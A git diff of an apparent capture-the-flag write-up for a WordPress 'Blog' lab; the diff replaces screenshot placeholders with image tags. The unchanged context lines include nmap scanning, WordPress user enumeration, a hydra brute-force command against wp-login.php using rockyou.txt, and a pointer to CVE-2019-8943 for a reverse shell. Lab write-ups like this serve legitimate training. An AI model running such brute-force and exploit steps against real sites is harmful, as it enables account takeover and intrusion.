@@ -20,7 +20,7 @@ echo '<TARGET_IP> blog.thm' >> /etc/hosts
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="724" height="270" alt="SCREEN01" src="https://github.com/user-attachments/assets/d73d1638-f989-4140-b880-5b740048ca5f" />
 
 3. Navigate to `http://blog.thm` and examine the WordPress site. Check for user enumeration via author pages
    - Found two WordPress users: `bjoel` and `kwheel`
@@ -31,7 +31,7 @@ nmap <TARGET_IP>
 hydra -l kwheel -P /root/Tools/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
 ```
 
-[SCREEN03]
+<img width="723" height="393" alt="SCREEN03" src="https://github.com/user-attachments/assets/492a5387-6fd0-450f-a0cb-7af9db1ca998" />
 
 4. After gaining WordPress admin access with kwheel's credentials, exploit the WordPress Crop Image RCE vulnerability (CVE-2019-8943) to gain reverse shell access
 
@@ -91,4 +91,4 @@ find / -type f -name 'user.txt' 2>/dev/null
    - **CMS:** WordPress
    - **Version:** 5.0
 
-[SCREEN02]
+<img width="1070" height="335" alt="SCREEN02" src="https://github.com/user-attachments/assets/78c8ea15-ef91-49fd-8b70-cd0fb4f3aecd" />
